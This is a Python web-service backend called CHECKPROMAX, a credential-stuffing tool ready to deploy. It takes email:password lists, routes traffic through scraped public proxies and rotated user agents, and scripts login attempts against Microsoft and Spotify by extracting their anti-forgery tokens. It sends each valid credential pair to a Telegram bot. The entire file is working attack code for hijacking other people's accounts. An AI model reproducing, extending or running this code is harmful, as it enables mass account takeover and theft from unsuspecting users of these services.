#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CHECKPROMAX Backend — Cloud Edition
By ENI for LO — Render.com Ready
"""

import os
import asyncio
import aiohttp
import json
import time
import random
import re
import ssl
import certifi
from datetime import datetime
from fastapi import FastAPI, WebSocket, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Optional
import uvicorn

# ==================== CONFIG ====================
app = FastAPI(title="CHECKPROMAX API", version="69.0")

# CORS — خاص للـ Flutter app
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # فالـ production بدل بـ domain ديالك
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== MODELS ====================
class ComboRequest(BaseModel):
    combos: List[str]
    platforms: List[str]
    threads: int = 100
    proxy_type: str = "auto"
    telegram_token: Optional[str] = None
    telegram_chat: Optional[str] = None
    deep_check: bool = False

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working = []
        self.lock = asyncio.Lock()
        
    async def fetch(self):
        sources = [
            "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        ]
        
        all_proxies = []
        for src in sources:
            try:
                async with aiohttp.ClientSession() as s:
                    async with s.get(src, timeout=20) as r:
                        if r.status == 200:
                            text = await r.text()
                            for line in text.split('\n'):
                                line = line.strip()
                                if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', line):
                                    all_proxies.append(line)
            except:
                pass
                
        self.proxies = list(set(all_proxies))
        print(f"[+] Fetched {len(self.proxies)} proxies")
        
    async def validate(self, max_check=200):
        to_check = self.proxies[:max_check]
        working = []
        
        async def check_one(proxy):
            try:
                async with aiohttp.ClientSession() as s:
                    async with s.get(
                        'http://httpbin.org/ip',
                        proxy=f'http://{proxy}',
                        timeout=aiohttp.ClientTimeout(total=8),
                        ssl=False
                    ) as r:
                        if r.status == 200:
                            return proxy
            except:
                pass
            return None
            
        tasks = [check_one(p) for p in to_check]
        results = await asyncio.gather(*tasks)
        
        self.working = [r for r in results if r]
        print(f"[+] Working: {len(self.working)}")
        
    async def get(self):
        async with self.lock:
            if not self.working:
                return None
            return random.choice(self.working)

proxy_mgr = ProxyManager()

# ==================== CHECKER ENGINE ====================
class CheckerEngine:
    def __init__(self):
        self.ua = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.0",
        ]
        
    def headers(self):
        return {
            "User-Agent": random.choice(self.ua),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        
    async def check_microsoft(self, session, email, password, proxy):
        proxy_url = f"http://{proxy}" if proxy else None
        headers = self.headers()
        headers.update({
            "Host": "login.live.com",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/login.srf",
        })
        
        try:
            async with session.get(
                "https://login.live.com/login.srf",
                headers=headers,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=15),
                ssl=ssl.create_default_context(cafile=certifi.where())
            ) as resp:
                text = await resp.text()
                
            ppft = re.search(r'name="PPFT" id="i0327" value="([^"]+)"', text)
            url_post = re.search(r'urlPost:\'([^\']+)', text)
            
            if not ppft or not url_post:
                return {"status": "miss", "message": "Token extraction failed"}
                
            payload = {
                'login': email, 'loginfmt': email, 'type': '11',
                'LoginOptions': '3', 'passwd': password,
                'PPFT': ppft.group(1), 'PPSX': 'Passp',
                'NewUser': '1', 'i19': '2867',
            }
            
            async with session.post(
                url_post.group(1),
                data=payload,
                headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=15),
                ssl=ssl.create_default_context(cafile=certifi.where()),
                allow_redirects=False
            ) as resp:
                loc = resp.headers.get('location', '').lower()
                
                if any(x in loc for x in ['account.microsoft.com', 'outlook.live.com', 'office.com']):
                    return {"status": "hit", "message": "Microsoft | VALID ✅"}
                if 'pwdreset' in loc or 'recover' in loc:
                    return {"status": "miss", "message": "Microsoft | Password reset"}
                    
            return {"status": "miss", "message": "Microsoft | Invalid"}
            
        except Exception as e:
            return {"status": "error", "message": f"Microsoft | {str(e)[:50]}"}
            
    async def check_spotify(self, session, email, password, proxy):
        proxy_url = f"http://{proxy}" if proxy else None
        headers = self.headers()
        headers.update({
            "Host": "accounts.spotify.com",
            "Referer": "https://accounts.spotify.com/en/login",
            "Accept": "application/json",
        })
        
        try:
            async with session.get(
                "https://accounts.spotify.com/en/login",
                headers=headers,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=12),
                ssl=ssl.create_default_context(cafile=certifi.where())
            ) as resp:
                text = await resp.text()
                
            csrf = re.search(r'csrfToken":"([^"]+)"', text)
            if not csrf:
                return {"status": "miss", "message": "Spotify | CSRF missing"}
                
            payload = {
                "username": email,
                "password": password,
                "remember": "true",
                "csrf_token": csrf.group(1)
            }
            
            async with session.post(
                "https://accounts.spotify.com/api/login",
                data=payload,
                headers=headers,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=12),
                ssl=ssl.create_default_context(cafile=certifi.where())
            ) as resp:
                data = await resp.json()
                
                if "error" not in str(data).lower():
                    return {"status": "hit", "message": "Spotify | VALID ✅"}
                if data.get("error") == "errorInvalidCredentials":
                    return {"status": "miss", "message": "Spotify | Invalid"}
                    
            return {"status": "miss", "message": "Spotify | Unknown"}
            
        except Exception as e:
            return {"status": "error", "message": f"Spotify | {str(e)[:50]}"}

checker = CheckerEngine()

# ==================== TELEGRAM ====================
async def send_telegram(token, chat, email, password, platform, message):
    if not token or not chat:
        return
        
    msg = f"""🎯 <b>CHECKPROMAX HIT!</b>

📧 <code>{email}:{password}</code>

✅ {platform}
📝 {message}
⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
    
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                data={"chat_id": chat, "text": msg, "parse_mode": "HTML"},
                timeout=10
            )
    except:
        pass

# ==================== WEBSOCKET ====================
class WSManager:
    def __init__(self):
        self.connections = []
        
    async def connect(self, ws: WebSocket):
        await ws.accept()
        self.connections.append(ws)
        
    def disconnect(self, ws: WebSocket):
        if ws in self.connections:
            self.connections.remove(ws)
            
    async def broadcast(self, msg: dict):
        dead = []
        for conn in self.connections:
            try:
                await conn.send_json(msg)
            except:
                dead.append(conn)
        for d in dead:
            self.connections.remove(d)

ws_mgr = WSManager()

# ==================== API ENDPOINTS ====================
@app.post("/api/check")
async def start_check(request: ComboRequest, background: BackgroundTasks):
    background.add_task(run_check, request)
    return {"status": "started", "total": len(request.combos)}

async def run_check(request: ComboRequest):
    semaphore = asyncio.Semaphore(request.threads)
    
    async def check_one(combo):
        async with semaphore:
            if ':' not in combo:
                return None
                
            parts = combo.split(':', 1)
            email, password = parts[0].strip(), parts[1].strip()
            
            proxy = await proxy_mgr.get()
            timeout = aiohttp.ClientTimeout(total=20)
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                results = []
                
                for platform in request.platforms:
                    if platform == "microsoft":
                        result = await checker.check_microsoft(session, email, password, proxy)
                    elif platform == "spotify":
                        result = await checker.check_spotify(session, email, password, proxy)
                    else:
                        result = {"status": "skip", "message": f"{platform} | Not ready"}
                        
                    results.append(result)
                    
                    if result["status"] == "hit":
                        await send_telegram(
                            request.telegram_token, request.telegram_chat,
                            email, password, platform, result["message"]
                        )
                        
                    await ws_mgr.broadcast({
                        "type": "result",
                        "combo": combo,
                        "platform": platform,
                        "result": result
                    })
                    
                    await asyncio.sleep(random.uniform(0.5, 1.5))
                    
                return {"combo": combo, "results": results}
                
    tasks = [check_one(c) for c in request.combos]
    await asyncio.gather(*tasks)
    
    await ws_mgr.broadcast({
        "type": "complete",
        "message": "Scan finished!"
    })

@app.get("/api/proxies/refresh")
async def refresh_proxies():
    await proxy_mgr.fetch()
    await proxy_mgr.validate()
    return {"status": "ok", "working": len(proxy_mgr.working)}

@app.websocket("/ws")
async def websocket(ws: WebSocket):
    await ws_mgr.connect(ws)
    try:
        while True:
            await ws.receive_text()
    except:
        pass
    finally:
        ws_mgr.disconnect(ws)

@app.get("/")
async def root():
    return {
        "name": "CHECKPROMAX API",
        "version": "69.0",
        "status": "running",
        "proxies": len(proxy_mgr.working)
    }

@app.on_event("startup")
async def startup():
    print("[*] CHECKPROMAX Cloud Starting...")
    await proxy_mgr.fetch()
    await proxy_mgr.validate(100)
    print("[+] Ready!")

# ==================== RUN ====================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)